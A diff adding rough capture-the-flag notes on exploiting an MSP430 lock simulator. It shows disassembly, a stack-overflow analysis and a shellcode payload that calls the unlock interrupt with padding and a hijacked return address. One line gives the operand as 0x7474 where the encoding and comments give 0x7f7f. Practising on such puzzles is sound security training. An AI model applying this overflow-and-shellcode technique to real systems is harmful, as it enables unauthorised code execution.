@@ -1,0 +1,104 @@
+
+----------------------------------------
+
+4446 <conditional_unlock_door>
+4446:  0412           push	r4
+4448:  0441           mov	sp, r4
+444a:  2453           incd	r4
+444c:  2183           decd	sp
+444e:  c443 fcff      mov.b	#0x0, -0x4(r4)
+4452:  3e40 fcff      mov	#0xfffc, r14
+4456:  0e54           add	r4, r14
+4458:  0e12           push	r14
+445a:  0f12           push	r15
+445c:  3012 7e00      push	#0x7e
+4460:  b012 4c45      call	#0x454c <INT>
+4464:  5f44 fcff      mov.b	-0x4(r4), r15
+4468:  8f11           sxt	r15
+446a:  3152           add	#0x8, sp
+446c:  3441           pop	r4
+446e:  3041           ret
+
+
+r14 43e8
+r15 43ee
+
+push r14
+push r15
+push 7e
+
+
+----------------------------------------
+
+in login
+
+    get pass
+
+    451e:  3d40 6400      mov	#0x64, r13
+    4522:  0e43           clr	r14
+    4524:  3f40 0024      mov	#0x2400, r15
+    4528:  b012 f045      call	#0x45f0 <memset>
+    452c:  0f41           mov	sp, r15
+    452e:  b012 4644      call	#0x4446 <conditional_unlock_door>
+
+
+----------
+
+try and get wrong string on purpose
+can write 16 bytes and and address
+after prints wrong pass message it pop stack pop stack to byte code
+hijack this functionality
+
+453c:  3f40 d544      mov	#0x44d5 "That password is not correct.", r15
+4540:  b012 b045      call	#0x45b0 <puts>
+4544:  3150 1000      add	#0x10, sp
+4548:  3041           ret
+
+
+
+return is at 43fe (sp+0x10)
+buffer at location 43ee = 16 bytes
+
+need a byte code string with no null bytes '0x00'
+want to get a 7f on stack then call interrupt
+7f unlocks without password
+
+get a 7f into register using the or instruction (bis)
+then push register to stack
+
+
+bis	X, r15   ==  set r15 to X
+
+got to put 7f into a register
+load a '0x7f7f' into r15
+
+    bis	#0x7474, r15
+    3fd0 7f7f
+
+
+move byte '0x7f' to r14
+
+    mov.b	r15, r14
+    4e4f
+
+
+push r14 to stack
+
+    push r14
+    0e12
+
+call interrupt to trigger unlock
+
+    call	#0x454c <INT>
+    b012 4c45
+
+
+payload + 4 bytes pad + ret addr
+
+
+3fd0 7f7f 4e4f 0e12 b012 4c45
+
+4141 4141
+
+ee43
+
